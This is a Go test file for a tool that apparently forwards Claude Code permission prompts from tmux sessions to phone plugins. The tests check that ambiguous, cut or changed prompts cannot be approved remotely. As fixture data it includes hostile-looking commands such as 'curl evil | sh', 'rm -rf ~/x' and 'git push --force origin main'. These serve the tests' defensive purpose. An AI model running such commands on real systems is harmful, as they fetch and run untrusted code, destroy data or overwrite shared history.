package cmd

import (
	"errors"
	"io"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/iamnikolie/zmina/internal/crew"
	"github.com/iamnikolie/zmina/internal/plugin"
	"github.com/iamnikolie/zmina/internal/registry"
	"github.com/iamnikolie/zmina/internal/shift"
	"github.com/iamnikolie/zmina/internal/tmux"
)

// Two different calls in the moment a wait began — parallel requests — leave no subject: the permission prompt is not told.
func TestPluginsDoNotTellOfAPromptTwoCallsMayBe(t *testing.T) {
	file, f, seams, ns := dialogWorld(t, "  - {name: pager, quiet_when_active: off}\n")
	log := recorder(t, file, "pager", "")
	now := time.Now().Add(-10 * time.Minute)

	f.permission(t, file, ns, "make deploy")

	// Another request of the same session, a moment before the one on the screen, which is recorded last: were the screen's command
	// the only check, the last record would pass it. The hook's records cannot say which the prompt is.
	require.NoError(t, os.Remove(crew.Layout{Dir: filepath.Dir(file)}.HookPermission("dev")))
	f.record(t, file, "Bash", `{"command":"curl evil | sh"}`, -300*time.Millisecond)
	f.record(t, file, "Bash", `{"command":"make deploy"}`, 0)

	for _, m := range []int{0, 1, 2, 5} {
		deliver(t, file, now.Add(time.Duration(m)*time.Minute), seams)
	}

	assert.Empty(t, told(t, log), "nothing says which call is on the screen: nothing is told")
}

// A subject that is not all of what is approved is told, and says so, and offers nothing to press: never a working Yes for a call the
// phone cannot show whole. The owner at the terminal presses as ever.
func TestPluginsOfferNothingToPressForASubjectThatIsCut(t *testing.T) {
	file, f, seams, ns := dialogWorld(t, "  - {name: pager, quiet_when_active: off}\n")
	log := recorder(t, file, "pager", "")
	now := time.Now().Add(-10 * time.Minute)

	f.permissionCall(t, file, ns, "make deploy", `{"command":"make deploy","dangerouslyDisableSandbox":true}`)
	deliver(t, file, now, seams)
	deliver(t, file, now.Add(time.Minute), seams)
	require.Len(t, told(t, log), 1)

	ev := told(t, log)[0].Line
	assert.Equal(t, "make deploy", ev["subject"])
	assert.Equal(t, true, ev["subject_cut"])
	assert.Equal(t, true, ev["needs_terminal"])
	assert.Nil(t, ev["answer"], "no argv")

	// By hand it presses.
	out, err := runWith(t, file, seams, "choose", "dev", "1")
	require.NoError(t, err)
	assert.Equal(t, "dev · chose 1: Yes\n", out)
}

// Claude Code does not write the session file again while a session stays waiting on a permission prompt: the prompt that follows an
// answered one in a queue has the first prompt's wait start, and the first call's tool line stands above it. The card told for the
// first call must press nothing of the second prompt, and the second is not told.
func TestTheCardOfAQueuesFirstCallPressesNothingOfTheSecond(t *testing.T) {
	file, f, seams, ns := dialogWorld(t, "  - {name: pager, quiet_when_active: off}\n")
	log := recorder(t, file, "pager", "")
	now := time.Now().Add(-10 * time.Minute)

	f.permission(t, file, ns, "make deploy")
	deliver(t, file, now, seams)
	deliver(t, file, now.Add(time.Minute), seams)
	require.Len(t, told(t, log), 1)

	card := told(t, log)[0].Line
	assert.Equal(t, "make deploy", card["subject"])
	assert.Equal(t, true, card["subject_checked"])
	assert.NotNil(t, card["answer"], "a single prompt is pressable")

	// A second request is recorded while the first prompt is up, and the owner answers the first at the keyboard: the second comes up
	// at once, with the first's tool line above it, and the session file says what it said.
	f.record(t, file, "Bash", `{"command":"git push --force origin main"}`, 5*time.Second)

	f.mu.Lock()
	f.screen = "⏺ Bash(make deploy)\n  ⎿  ok\n\n" + strings.Replace(f.screen, "make deploy", "git push --force origin main", 1)
	f.mu.Unlock()

	// The press of the first card, now, presses nothing: the second call's record has made the question another one.
	t.Setenv("ZMINA_PLUGIN", "pager")

	_, err := runWith(t, file, seams, "choose", "dev", "1", "--dialog", card["id"].(string), "--by", "pager")
	require.Error(t, err)
	assert.ErrorContains(t, err, "the question on its screen changed")
	assert.Empty(t, f.pressed(), "no keys")

	for m := 2; m <= 4; m++ {
		deliver(t, file, now.Add(time.Duration(m)*time.Minute), seams)
	}

	assert.Equal(t, []string{"dialog " + card["id"].(string), "answered " + card["id"].(string)}, toldIDs(t, log),
		"the first card is closed; the second prompt, which nothing certainly names, is not told")

	_, err = runWith(t, file, seams, "choose", "dev", "1", "--dialog", card["id"].(string), "--by", "pager")
	require.Error(t, err)
	assert.Empty(t, f.pressed())
}

// The normal case, the golden screen of one shell prompt: told with its subject, checked against the prompt's block, with a button for
// each choice that presses it.
func TestASingleGoldenShellPromptIsToldWithAWorkingButton(t *testing.T) {
	file, f, seams, ns := dialogWorld(t, "  - {name: pager, quiet_when_active: off}\n")
	log := recorder(t, file, "pager", "")
	now := time.Now().Add(-10 * time.Minute)

	raw, err := os.ReadFile(filepath.Join("..", "internal", "shift", "testdata", "screens", "claude", "permission-bash.txt"))
	require.NoError(t, err)

	f.permissionRaw(t, file, ns, string(raw), "Bash", `{"command":"rm -rf build","description":"Remove the stale build directory"}`)
	deliver(t, file, now, seams)
	deliver(t, file, now.Add(time.Minute), seams)
	require.Len(t, told(t, log), 1)

	ev := told(t, log)[0].Line
	assert.Equal(t, "permission", ev["prompt"])
	assert.Equal(t, "Bash", ev["tool"])
	assert.Equal(t, "rm -rf build", ev["subject"])
	assert.Equal(t, true, ev["subject_checked"])
	assert.Nil(t, ev["subject_cut"])
	assert.Nil(t, ev["needs_terminal"])
	require.Len(t, ev["options"], 3)

	opts := ev["answer"].(map[string]any)["options"].([]any)
	require.Len(t, opts, 3, "a button for each choice")

	t.Setenv("ZMINA_PLUGIN", "pager")

	// The third choice: two Downs and Enter, as the arrows would.
	args := func(i int) []string {
		var out []string

		for _, w := range opts[i].(map[string]any)["argv"].([]any)[3:] {
			out = append(out, w.(string))
		}

		return out
	}

	out, err := runWith(t, file, seams, args(2)...)
	require.NoError(t, err)
	assert.Contains(t, out, "chose 3: No, and tell Claude what to do differently (esc)")
	assert.Equal(t, [][]string{{"Down", "Down", "Enter"}}, f.pressed(), "the keys went")

	// The same card, again: it is spent.
	_, err = runWith(t, file, seams, args(0)...)
	require.ErrorContains(t, err, "used already")
	assert.Len(t, f.pressed(), 1)
}

// A prompt of a tool no golden shows is told with its subject when the record is unambiguous, and offers nothing to press: nothing of
// the screen is compared with it.
func TestAPromptOfAToolNoGoldenShowsOffersNothingToPress(t *testing.T) {
	file, f, seams, ns := dialogWorld(t, "  - {name: pager, quiet_when_active: off}\n")
	log := recorder(t, file, "pager", "")
	now := time.Now().Add(-10 * time.Minute)

	screen := " Fetch\n\n   https://example.com/page\n\n Do you want to allow Claude to fetch this content?\n ❯ 1. Yes\n   2. No, and tell Claude what to do differently (esc)\n\n" +
		" Esc to cancel · Tab to amend\n"

	f.permissionRaw(t, file, ns, screen, "WebFetch", `{"url":"https://example.com/page"}`)
	deliver(t, file, now, seams)
	deliver(t, file, now.Add(time.Minute), seams)
	require.Len(t, told(t, log), 1)

	ev := told(t, log)[0].Line
	assert.Equal(t, "https://example.com/page", ev["subject"])
	assert.Equal(t, true, ev["needs_terminal"])
	assert.Nil(t, ev["subject_checked"])
	assert.Nil(t, ev["answer"], "no argv")

	// And a press with a mark it somehow had is refused by the press itself.
	id := ev["id"].(string)
	t.Setenv("ZMINA_PLUGIN", "pager")

	_, err := runWith(t, file, seams, "choose", "dev", "1", "--dialog", id, "--by", "pager")
	require.ErrorContains(t, err, "answer it in a terminal")
	assert.Empty(t, f.pressed())
}

// A call of several lines is told with its breaks shown, and offers nothing to press.
func TestACallOfSeveralLinesIsToldWithItsBreaksAndNoButton(t *testing.T) {
	file, f, seams, ns := dialogWorld(t, "  - {name: pager, quiet_when_active: off}\n")
	log := recorder(t, file, "pager", "")
	now := time.Now().Add(-10 * time.Minute)

	f.permissionRaw(t, file, ns, " Bash command\n\n   echo ok\n   rm -rf ~/x\n\n Do you want to proceed?\n ❯ 1. Yes\n   2. No\n\n Esc to cancel · Tab to amend\n",
		"Bash", `{"command":"echo ok\nrm -rf ~/x"}`)
	deliver(t, file, now, seams)
	deliver(t, file, now.Add(time.Minute), seams)
	require.Len(t, told(t, log), 1)

	ev := told(t, log)[0].Line
	assert.Equal(t, "echo ok ⏎ rm -rf ~/x", ev["subject"], "the break is shown")
	assert.Equal(t, true, ev["subject_cut"])
	assert.Equal(t, true, ev["needs_terminal"])
	assert.Nil(t, ev["answer"])
}

// A session file that says no moment the wait began (0 is 1970, not the zero time) is no wait a one-shot mark can be of: nothing is
// told of its question.
func TestNothingIsToldOfAWaitWithNoStartMoment(t *testing.T) {
	file, f, seams, ns := dialogWorld(t, "  - {name: pager, quiet_when_active: off}\n")
	log := recorder(t, file, "pager", "")
	now := time.Now().Add(-10 * time.Minute)

	f.show(t, ns, true)

	body := `{"pid": ` + strconv.Itoa(f.pid) + `, "sessionId": "sid-1", "status": "waiting", "waitingFor": "input needed", "statusUpdatedAt": 0}`
	require.NoError(t, os.WriteFile(filepath.Join(ns, "sessions", strconv.Itoa(f.pid)+".json"), []byte(body), 0o600))

	for _, m := range []int{0, 1, 2, 5} {
		deliver(t, file, now.Add(time.Duration(m)*time.Minute), seams)
	}

	assert.Empty(t, told(t, log))
}

// The cockpit's button is a press like any: it spends the cards of its wait, so a plugin's card of the same question presses nothing
// after it.
func TestTheCockpitsPressSpendsTheCardsOfItsWait(t *testing.T) {
	file, f, seams, ns := dialogWorld(t, "  - {name: pager, quiet_when_active: off}\n")
	log := recorder(t, file, "pager", "")
	now := time.Now().Add(-10 * time.Minute)

	f.permission(t, file, ns, "make deploy")
	deliver(t, file, now, seams)
	deliver(t, file, now.Add(time.Minute), seams)
	require.Len(t, told(t, log), 1)

	card := told(t, log)[0].Line["id"].(string)
	fingerprint := strings.Split(card, ":")[1]

	a := &app{crew: file, out: io.Discard, err: io.Discard, shiftSeams: seams}
	require.NoError(t, a.withState(func(s *shift.Shift) error { return chooseDialog(s, "dev", "1:"+fingerprint) }))
	require.Len(t, f.pressed(), 1)

	t.Setenv("ZMINA_PLUGIN", "pager")

	_, err := runWith(t, file, seams, "choose", "dev", "1", "--dialog", card, "--by", "pager")
	require.Error(t, err)
	assert.ErrorContains(t, err, "used already")
	assert.Len(t, f.pressed(), 1, "the question is still on the fake screen: the card must not press it again")
}

// A card whose delivery failed and waits for its retry is held to what a first delivery is: the question answered and asked again
// meanwhile makes the card one of a wait that is over. It is not sent, and a fresh card is told of the question.
func TestARetriedDialogEventIsReadAgainLikeAFirstOne(t *testing.T) {
	file, f, seams, ns := dialogWorld(t, "  - {name: pager, quiet_when_active: off}\n")
	up := filepath.Join(filepath.Dir(file), "up")
	log := recorder(t, file, "pager", "[ -f "+up+" ] || exit 1")
	now := time.Now().Add(-2 * time.Hour)

	f.permission(t, file, ns, "make deploy")
	deliver(t, file, now, seams)
	deliver(t, file, now.Add(time.Minute), seams)
	require.Len(t, told(t, log), 1, "the first try, which failed")

	dead := told(t, log)[0].Line["id"].(string)

	// Answered and asked again, the very same words, while the plugin was down; and it is up again.
	f.permission(t, file, ns, "make deploy")
	require.NoError(t, os.WriteFile(up, nil, 0o600))

	deliver(t, file, now.Add(3*time.Minute), seams) // the retry is due
	deliver(t, file, now.Add(4*time.Minute), seams)
	deliver(t, file, now.Add(5*time.Minute), seams)

	ids := toldIDs(t, log)
	require.Len(t, ids, 2, "%v", ids)
	assert.NotEqual(t, "dialog "+dead, ids[1], "the old line was not sent again: a fresh card")
	assert.Equal(t, "dialog", told(t, log)[1].Event)

	// The dead card's mark is disarmed.
	t.Setenv("ZMINA_PLUGIN", "pager")

	_, err := runWith(t, file, seams, "choose", "dev", "1", "--dialog", dead, "--by", "pager")
	require.ErrorContains(t, err, "not armed")
	assert.Empty(t, f.pressed())
}

// After a tmux that did not answer in time the mark is not given back: the keys may have landed, and a second press must not follow a
// first that may have. After a definite failure to send it is.
func TestAPressThatMayHaveLandedIsNotGivenBack(t *testing.T) {
	file, f, seams, ns := dialogWorld(t, "  - {name: pager, quiet_when_active: off}\n")
	log := recorder(t, file, "pager", "")
	now := time.Now().Add(-10 * time.Minute)

	f.permission(t, file, ns, "make deploy")
	deliver(t, file, now, seams)
	deliver(t, file, now.Add(time.Minute), seams)

	card := told(t, log)[0].Line["id"].(string)
	t.Setenv("ZMINA_PLUGIN", "pager")

	g := &failingKeys{dialogScreenTmux: f, err: tmux.NewNoAnswer("tmux send-keys: no answer in 5s")}
	timedOut := func(s *shift.Shift) { s.Tmux, s.Reg = g, &registry.Registry{Namespace: ns} }

	_, err := runWith(t, file, timedOut, "choose", "dev", "1", "--dialog", card, "--by", "pager")
	require.Error(t, err)

	_, err = runWith(t, file, seams, "choose", "dev", "1", "--dialog", card, "--by", "pager")
	require.Error(t, err, "it may have landed: not given back")
	assert.ErrorContains(t, err, "used already")
	assert.Empty(t, f.pressed())

	// A definite failure gives it back (TestPluginPressIsOneShot): another card, another wait.
	f.permission(t, file, ns, "make deploy 2")
	deliver(t, file, now.Add(2*time.Minute), seams)
	deliver(t, file, now.Add(3*time.Minute), seams)

	var second string

	for _, g := range told(t, log) {
		if g.Event == "dialog" && g.Line["subject"] == "make deploy 2" {
			second = g.Line["id"].(string)
		}
	}

	require.NotEmpty(t, second)

	g.err = errors.New("tmux send-keys: can't find pane")
	_, err = runWith(t, file, timedOut, "choose", "dev", "1", "--dialog", second, "--by", "pager")
	require.Error(t, err)

	_, err = runWith(t, file, seams, "choose", "dev", "1", "--dialog", second, "--by", "pager")
	require.NoError(t, err, "a definite failure to send gave the mark back")
}

// forgeCard arms a mark for the dialog the role's view shows now, as a plugin that had been told of it would hold one, and returns the
// id of the event that would have carried it. It is how the press itself is tried, past everything that decides a card is made.
func forgeCard(t *testing.T, file string, seams func(s *shift.Shift), pluginName string) string {
	t.Helper()

	var (
		id    string
		since time.Time
	)

	a := &app{crew: file, out: io.Discard, err: io.Discard, shiftSeams: seams}
	require.NoError(t, a.readState(func(s *shift.Shift) error {
		v := viewOf(s, "dev")
		require.NotNil(t, v)
		require.NotNil(t, v.Dialog)
		id, since = v.Dialog.ID, v.Since

		return nil
	}))

	nonce := plugin.NewNonce()
	require.NoError(t, armedOf(file, pluginName).Arm(nonce, plugin.DialogID("dev", id), since, time.Now()))

	return plugin.EventDialogID("dev", id, nonce)
}

// A permission prompt under a wait the session file says is of a question — the file is not written again while a session stays
// waiting — is not told, and a card for it is refused at the press: a question wait is told and pressed only when the hook's question
// record is of this wait and the screen shows that question.
func TestAPermissionPromptUnderAQuestionWaitIsNeitherToldNorPressed(t *testing.T) {
	file, f, seams, ns := dialogWorld(t, "  - {name: pager, quiet_when_active: off}\n")
	log := recorder(t, file, "pager", "")
	now := time.Now().Add(-10 * time.Minute)

	// The review's repro: the file says "input needed", the screen is a shell permission prompt.
	f.mu.Lock()
	f.waitingFor = "input needed"
	f.asked = ""
	f.screen = " Bash command\n\n   git push --force origin main\n\n Do you want to proceed?\n ❯ 1. Yes\n" +
		"   2. Yes, and don't ask again for this command\n   3. No, and tell Claude what to do differently (esc)\n\n" +
		" Esc to cancel · Tab to amend · ctrl+e to explain\n"
	f.mu.Unlock()
	f.show(t, ns, true)
	f.record(t, file, "Bash", `{"command":"git push --force origin main"}`, 0)

	for _, m := range []int{0, 1, 2, 5} {
		deliver(t, file, now.Add(time.Duration(m)*time.Minute), seams)
	}

	assert.Empty(t, told(t, log), "no blind card for it")

	// A card that somehow had a mark is refused at the press.
	card := forgeCard(t, file, seams, "pager")
	t.Setenv("ZMINA_PLUGIN", "pager")

	_, err := runWith(t, file, seams, "choose", "dev", "1", "--dialog", card, "--by", "pager")
	require.Error(t, err)
	assert.ErrorContains(t, err, "answer it in a terminal")
	assert.Empty(t, f.pressed(), "no keys")

	// The same under a question record that does not match the screen (a question asked and answered, and a permission prompt come).
	f.mu.Lock()
	f.asked = shipItAsked
	f.mu.Unlock()
	f.show(t, ns, true)
	f.record(t, file, "Bash", `{"command":"git push --force origin main"}`, 0)

	for _, m := range []int{6, 7, 8} {
		deliver(t, file, now.Add(time.Duration(m)*time.Minute), seams)
	}

	assert.Empty(t, told(t, log))

	card = forgeCard(t, file, seams, "pager")
	_, err = runWith(t, file, seams, "choose", "dev", "1", "--dialog", card, "--by", "pager")
	require.ErrorContains(t, err, "answer it in a terminal")
	assert.Empty(t, f.pressed())
}

// Even a question that its record and the screen agree on is not told, nor pressed, when the signs of a permission prompt are there:
// a call recorded for the role since the wait began, or a permission prompt's title on the screen.
func TestAQuestionWithTheSignsOfAPermissionPromptIsNeitherToldNorPressed(t *testing.T) {
	file, f, seams, ns := dialogWorld(t, "  - {name: pager, quiet_when_active: off}\n")
	log := recorder(t, file, "pager", "")
	now := time.Now().Add(-10 * time.Minute)

	// A normal question is told (and with no hint, pressable).
	f.show(t, ns, true)
	deliver(t, file, now, seams)
	deliver(t, file, now.Add(time.Minute), seams)
	require.Len(t, told(t, log), 1)
	assert.Equal(t, "question", told(t, log)[0].Line["prompt"])
	assert.NotNil(t, told(t, log)[0].Line["answer"])

	// A permission call is recorded in the same wait: the question card stops being one a press is let through for.
	card := told(t, log)[0].Line["id"].(string)

	f.record(t, file, "Bash", `{"command":"rm -rf build"}`, 2*time.Second)

	t.Setenv("ZMINA_PLUGIN", "pager")
	_, err := runWith(t, file, seams, "choose", "dev", "1", "--dialog", card, "--by", "pager")
	require.Error(t, err)
	assert.ErrorContains(t, err, "answer it in a terminal")
	assert.Empty(t, f.pressed())

	// And a fresh wait with a permission title above the question is not told at all.
	f.mu.Lock()
	f.screen = " Bash command\n\n   rm -rf build\n\n" + f.screen
	f.mu.Unlock()
	f.show(t, ns, true)

	for _, m := range []int{2, 3, 4} {
		deliver(t, file, now.Add(time.Duration(m)*time.Minute), seams)
	}

	assert.Len(t, told(t, log), 2, "the first card, and its answered: the new wait is not told")
	assert.Equal(t, "answered", told(t, log)[1].Event)
}

// A question that no hook recorded for this wait is not told: the screen's reading of a prompt is not what a card may press.
func TestAQuestionNoHookRecordedIsNotTold(t *testing.T) {
	file, f, seams, ns := dialogWorld(t, "  - {name: pager, quiet_when_active: off}\n")
	log := recorder(t, file, "pager", "")
	now := time.Now().Add(-10 * time.Minute)

	f.mu.Lock()
	f.asked = ""
	f.mu.Unlock()
	f.show(t, ns, true)

	for _, m := range []int{0, 1, 2, 5} {
		deliver(t, file, now.Add(time.Duration(m)*time.Minute), seams)
	}

	assert.Empty(t, told(t, log))
}

// The press itself refuses a permission prompt whose subject is cut, though a card with a mark for it is held: the check at the press
// is not the card's making.
func TestThePressRefusesACutSubjectThoughTheCardIsArmed(t *testing.T) {
	file, f, seams, ns := dialogWorld(t, "  - {name: pager, quiet_when_active: off}\n")
	f.permissionCall(t, file, ns, "make deploy", `{"command":"make deploy","dangerouslyDisableSandbox":true}`)

	card := forgeCard(t, file, seams, "pager")
	t.Setenv("ZMINA_PLUGIN", "pager")

	_, err := runWith(t, file, seams, "choose", "dev", "1", "--dialog", card, "--by", "pager")
	require.Error(t, err)
	assert.ErrorContains(t, err, "answer it in a terminal")
	assert.Empty(t, f.pressed(), "no keys")

	// By hand the owner presses, as ever.
	_, err = runWith(t, file, seams, "choose", "dev", "1")
	require.NoError(t, err)
	assert.Len(t, f.pressed(), 1)
}

// A record that changed between the card's telling and its press — replaced by another call, or gone — makes the prompt another one:
// the press is refused and sends no keys.
func TestARecordThatChangedBetweenTheTellingAndThePressRefusesIt(t *testing.T) {
	for name, change := range map[string]func(t *testing.T, file string, f *dialogScreenTmux){
		"replaced by another call": func(t *testing.T, file string, f *dialogScreenTmux) {
			require.NoError(t, os.Remove(crew.Layout{Dir: filepath.Dir(file)}.HookPermission("dev")))
			f.record(t, file, "Bash", `{"command":"git push --force origin main"}`, 0)
		},
		"gone": func(t *testing.T, file string, f *dialogScreenTmux) {
			require.NoError(t, os.Remove(crew.Layout{Dir: filepath.Dir(file)}.HookPermission("dev")))
		},
		"the same call, with a switch it did not have": func(t *testing.T, file string, f *dialogScreenTmux) {
			require.NoError(t, os.Remove(crew.Layout{Dir: filepath.Dir(file)}.HookPermission("dev")))
			f.record(t, file, "Bash", `{"command":"make deploy","dangerouslyDisableSandbox":true}`, 0)
		},
	} {
		t.Run(name, func(t *testing.T) {
			file, f, seams, ns := dialogWorld(t, "  - {name: pager, quiet_when_active: off}\n")
			log := recorder(t, file, "pager", "")
			now := time.Now().Add(-10 * time.Minute)

			f.permission(t, file, ns, "make deploy")
			deliver(t, file, now, seams)
			deliver(t, file, now.Add(time.Minute), seams)
			require.Len(t, told(t, log), 1)

			card := told(t, log)[0].Line["id"].(string)

			change(t, file, f)

			t.Setenv("ZMINA_PLUGIN", "pager")

			_, err := runWith(t, file, seams, "choose", "dev", "1", "--dialog", card, "--by", "pager")
			require.Error(t, err)
			assert.Empty(t, f.pressed(), "no keys")
		})
	}
}
